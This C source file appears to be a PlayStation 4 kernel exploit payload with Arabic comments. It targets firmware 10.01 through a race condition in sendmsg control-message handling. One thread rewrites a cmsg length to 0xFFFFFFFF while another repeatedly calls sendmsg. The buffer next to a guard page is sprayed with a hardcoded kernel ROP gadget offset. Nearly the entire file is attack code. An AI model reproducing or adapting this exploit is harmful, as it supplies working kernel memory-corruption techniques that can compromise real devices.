#include <ps4.h>

// --- تعريف الهياكل المفقودة في libPS4 فقط ---
// ملاحظة: struct iovec موجود بالفعل في ps4.h لذا لن نعيد تعريفه

struct cmsghdr {
    uint32_t cmsg_len;   /* length include this hdr */
    int      cmsg_level; /* originating protocol */
    int      cmsg_type;  /* protocol-specific type */
};

struct msghdr {
    void           *msg_name;       /* optional address */
    uint32_t        msg_namelen;    /* size of address */
    struct iovec   *msg_iov;        /* scatter/gather array */
    int             msg_iovlen;     /* # elements in msg_iov */
    void           *msg_control;    /* ancillary data, see below */
    uint32_t        msg_controllen; /* ancillary data buffer len */
    int             msg_flags;      /* flags on received message */
};

// تعريف الثوابت المفقودة في بيئة الـ Payload
#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS 0x1000
#endif
#ifndef MAP_PRIVATE
#define MAP_PRIVATE 0x0002
#endif

// --- إعدادات الذاكرة الخاصة بالـ PS4 ---
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 256 
#define NCMSG         14

// الإزاحات لنسخة 10.01
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;

// --- 1. بناء البفر الجراحي (Alignment & Protection) ---
void BuildPrecisionBuffer(uint64_t kbase) {
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    // الحساب لضمان انتهاء البفر عند حدود الصفحة 0x4000
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);

    // حجز صفحتين (واحدة للبيانات وواحدة للحماية)
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (BaseArea == (uint8_t *)-1) {
        printf_debug("[!] mmap failed\n");
        return;
    }

    // حماية الصفحة الثانية (Unmapped Page)
    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    // موازنة البفر ليكون في نهاية الصفحة تماماً
    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    // تهيئة الـ cmsg
    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_level = 0;
        ControlBuf[i].cmsg_type = 7;
    }

    // وضع السم (Trigger)
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    
    for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }
}

// --- 2. خيط التخريب (Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg;
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i=0; i<40; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i=0; i<40; i++);
    }
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666; // التكتيك الذهبي للاستقرار

    while (!stop_race) {
        n_tries++;
        int ret = syscall(28, bad_fd, &msg, 0); // sendmsg
        
        if (ret == -1 && errno == 14) { // EFAULT
            stop_race = 1;
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();
    initSysUtil();

    uint64_t kbase = get_kernel_base();
    printf_debug("[+] PS4 Kernel Base: 0x%llx\n", kbase);

    BuildPrecisionBuffer(kbase);

    ScePthread wrid, exid;
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");

    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    printf_debug("[***] EFAULT DETECTED! Try: %llu\n", n_tries);
    return 0;
}
